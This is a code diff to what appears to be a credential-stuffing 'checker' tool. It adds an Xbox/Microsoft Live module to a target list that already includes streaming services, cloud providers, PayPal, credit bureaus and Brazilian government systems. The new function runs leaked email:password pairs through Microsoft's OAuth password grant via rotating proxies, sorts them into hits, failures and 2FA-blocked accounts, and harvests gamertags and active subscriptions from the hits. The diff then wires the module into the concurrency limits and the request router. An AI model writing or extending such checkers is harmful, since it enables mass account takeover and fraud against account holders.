@@ -92,7 +92,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "paypal" | "cpf";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf";
 
 export interface CheckResult {
   credential: string;
@@ -4433,6 +4433,164 @@ async function checkPayPal(login: string, password: string): Promise<CheckResult
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  XBOX / MICROSOFT LIVE CHECKER — email + senha (Microsoft OAuth2 → Xbox Live)
+//  Retorna: gamertag, tier (Gold/GamePass), linked subscriptions
+// ═══════════════════════════════════════════════════════════════════════════════
+const XBX_CLIENT_ID = "0000000048183522"; // Xbox public client ID (Xbox app)
+const XBX_TIMEOUT   = 30_000;
+
+async function checkXbox(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  try {
+    // Step 1 — Microsoft Live OAuth2 password grant
+    const msRes = await runCurlWithProxyRetry(px => [
+      "--compressed", "-L", "--http1.1",
+      "-X", "POST",
+      ...px,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "--data-urlencode", "grant_type=password",
+      "--data-urlencode", `client_id=${XBX_CLIENT_ID}`,
+      "--data-urlencode", `username=${login}`,
+      "--data-urlencode", `password=${password}`,
+      "--data-urlencode", "scope=service::user.auth.xboxlive.com::MBI_SSL",
+      "https://login.live.com/oauth20_token.srf",
+    ], XBX_TIMEOUT, 3);
+
+    if (msRes.statusCode !== 200) {
+      try {
+        const ej = JSON.parse(msRes.body) as Record<string, unknown>;
+        const err  = String(ej.error ?? "");
+        const desc = String(ej.error_description ?? "");
+        if (err === "invalid_grant" || desc.includes("AADSTS50126") || desc.includes("50126"))
+          return { credential, login, status: "FAIL", detail: "senha_invalida" };
+        if (desc.includes("AADSTS50076") || desc.includes("50076") || err.includes("mfa") || desc.includes("two_factor"))
+          return { credential, login, status: "ERROR", detail: "2fa_required" };
+        if (err === "user_not_found" || desc.includes("50034") || desc.includes("not found"))
+          return { credential, login, status: "FAIL", detail: "conta_nao_encontrada" };
+        if (err.includes("too_many") || err.includes("rate"))
+          return { credential, login, status: "ERROR", detail: "rate_limited" };
+        if (err) return { credential, login, status: "FAIL", detail: `ms_error:${err}` };
+      } catch { /**/ }
+      return { credential, login, status: "ERROR", detail: `MS_HTTP_${msRes.statusCode}` };
+    }
+
+    let msj: Record<string, unknown>;
+    try { msj = JSON.parse(msRes.body); } catch {
+      return { credential, login, status: "ERROR", detail: "ms_parse_error" };
+    }
+
+    const accessToken = String(msj.access_token ?? "");
+    if (!accessToken) return { credential, login, status: "ERROR", detail: "no_ms_token" };
+
+    // Step 2 — Authenticate with Xbox Live (XBL)
+    const xblRes = await runCurl([
+      "--compressed", "-L",
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "--data-raw", JSON.stringify({
+        RelyingParty: "http://auth.xboxlive.com",
+        TokenType: "JWT",
+        Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${accessToken}` },
+      }),
+      "https://user.auth.xboxlive.com/user/authenticate",
+    ], 15_000);
+
+    if (xblRes.statusCode !== 200)
+      return { credential, login, status: "ERROR", detail: `XBL_HTTP_${xblRes.statusCode}` };
+
+    let xblj: Record<string, unknown>;
+    try { xblj = JSON.parse(xblRes.body); } catch {
+      return { credential, login, status: "ERROR", detail: "xbl_parse_error" };
+    }
+
+    const xblToken = String(xblj.Token ?? "");
+    const xblClaims = xblj.DisplayClaims as Record<string, unknown> | undefined;
+    const uhs = String((xblClaims?.xui as Record<string, string>[])?.[0]?.uhs ?? "");
+    if (!xblToken) return { credential, login, status: "ERROR", detail: "no_xbl_token" };
+
+    // Step 3 — Get XSTS token (Xbox Secure Token Service)
+    const xstsRes = await runCurl([
+      "--compressed", "-L",
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "--data-raw", JSON.stringify({
+        RelyingParty: "http://xboxlive.com",
+        TokenType: "JWT",
+        Properties: { UserTokens: [xblToken], SandboxId: "RETAIL" },
+      }),
+      "https://xsts.auth.xboxlive.com/xsts/authorize",
+    ], 15_000);
+
+    let xstsj: Record<string, unknown>;
+    try { xstsj = JSON.parse(xstsRes.body); } catch {
+      return { credential, login, status: "ERROR", detail: "xsts_parse_error" };
+    }
+
+    if (xstsRes.statusCode !== 200) {
+      const xerr = Number((xstsj as Record<string, unknown>)?.XErr ?? 0);
+      if (xerr === 2148916233) return { credential, login, status: "ERROR", detail: "no_xbox_account" };
+      if (xerr === 2148916238) return { credential, login, status: "ERROR", detail: "child_account" };
+      return { credential, login, status: "ERROR", detail: `XSTS_${xerr || xstsRes.statusCode}` };
+    }
+
+    const xstsToken = String(xstsj.Token ?? "");
+    const authHeader = `XBL3.0 x=${uhs};${xstsToken}`;
+    const parts: string[] = [];
+
+    // Step 4 — Get Xbox profile (gamertag, tier)
+    const profileRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: ${authHeader}`,
+      "-H", "Accept: application/json",
+      "-H", "x-xbl-contract-version: 3",
+      "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier,XboxOneGamertag,GameDisplayPicRaw",
+    ], 10_000);
+
+    if (profileRes.statusCode === 200) {
+      try {
+        const pj = JSON.parse(profileRes.body) as Record<string, unknown>;
+        const users    = pj.profileUsers as Record<string, unknown>[] | undefined;
+        const settings = (users?.[0]?.settings as Record<string, string>[]) ?? [];
+        for (const s of settings) {
+          if (s.id === "Gamertag" || s.id === "XboxOneGamertag") { if (s.value) parts.push(`gamertag:${s.value}`); }
+          if (s.id === "AccountTier" && s.value) parts.push(`tier:${s.value}`);
+        }
+      } catch { /**/ }
+    }
+
+    // Step 5 — Check active subscriptions (Game Pass, Gold)
+    const subsRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: ${authHeader}`,
+      "-H", "Accept: application/json",
+      "-H", "x-xbl-contract-version: 6",
+      "https://subscriptions.xboxlive.com/subscriptions",
+    ], 10_000);
+
+    if (subsRes.statusCode === 200) {
+      try {
+        const sj = JSON.parse(subsRes.body) as Record<string, unknown>;
+        const subs = (sj.subscriptions ?? sj.items ?? []) as Record<string, unknown>[];
+        const actives = subs.filter(s =>
+          String(s.state ?? s.status ?? s.statusCode ?? "").toLowerCase().includes("active") ||
+          String(s.state ?? s.status ?? s.statusCode ?? "").toLowerCase().includes("subscribed")
+        );
+        if (actives.length > 0) {
+          const names = actives.map(s => String(s.displayName ?? s.productName ?? s.productId ?? "unknown")).filter(Boolean);
+          parts.push(`subs:${names.join(",").slice(0, 80)}`);
+        }
+      } catch { /**/ }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") || "xbox_authenticated" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -4475,6 +4633,7 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   epicgames:     3,   // OAuth2 + Fortnite profile — moderate
   steam:         2,   // RSA-encrypted login — conservative
   playstation:   3,   // Sony OAuth2 — moderate
+  xbox:          4,   // Microsoft Live OAuth2 + XBL — moderate
   // Financeiro Global
   paypal:        2,   // web scraping PayPal — conservative
   // VPS / Hosting extra
@@ -4524,6 +4683,7 @@ function resolveChecker(target: CheckerTarget) {
     case "epicgames":     return checkEpicGames;
     case "steam":         return checkSteam;
     case "playstation":   return checkPlayStation;
+    case "xbox":          return checkXbox;
     // Financeiro Global
     case "paypal":        return checkPayPal;
     // VPS / Hosting extra
@@ -4781,7 +4941,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "paypal", "cpf"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
